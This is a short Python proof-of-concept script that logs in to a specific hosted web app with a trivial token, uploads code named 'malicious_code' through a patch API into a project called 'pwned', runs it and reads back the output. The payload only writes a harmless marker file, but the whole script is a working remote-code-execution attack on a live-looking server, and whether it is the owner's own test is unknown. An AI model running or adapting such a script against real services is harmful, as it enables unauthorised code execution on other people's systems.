import requests

s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})

malicious_code = """
import os, glob
with open("out2.txt", "w") as f:
    f.write("Execution successful!")
"""
s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={"project": "pwned", "file": "main.py", "code": malicious_code})
r = s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
import time
time.sleep(2)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out2.txt')
print(r3.text)
